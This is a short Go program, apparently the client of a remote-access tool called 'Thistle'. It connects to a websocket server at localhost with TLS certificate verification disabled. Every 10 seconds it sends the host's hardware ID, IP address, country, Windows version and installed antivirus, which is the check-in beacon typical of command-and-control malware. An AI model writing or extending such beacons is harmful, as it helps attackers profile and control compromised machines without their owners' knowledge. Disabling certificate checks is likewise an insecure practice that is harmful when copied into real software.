package main

import (
	"crypto/tls"
	"log"
	"net/url"
	miscs "thistleclient/miscs"
	"time"

	"github.com/gorilla/websocket"
)

func main() {
	u := url.URL{Scheme: "wss", Host: "localhost:8080", Path: "/thistle"}
	log.Printf("Connecting to %s", u.String())

	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	c, _, err := dialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatalf("Dial error: %v", err)
	}
	defer c.Close()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	miscs.SendMessageAndReceive(c, "THISTLE"+"|"+miscs.SystemHWID()+"|"+miscs.GetClientIP()+"|"+miscs.GetNation()+"|"+miscs.GetWindows()+"|"+miscs.GetAntivirus())
	for range ticker.C {
		miscs.SendMessageAndReceive(c, "THISTLE"+"|"+miscs.SystemHWID()+"|"+miscs.GetClientIP()+"|"+miscs.GetNation()+"|"+miscs.GetWindows()+"|"+miscs.GetAntivirus())
	}
}
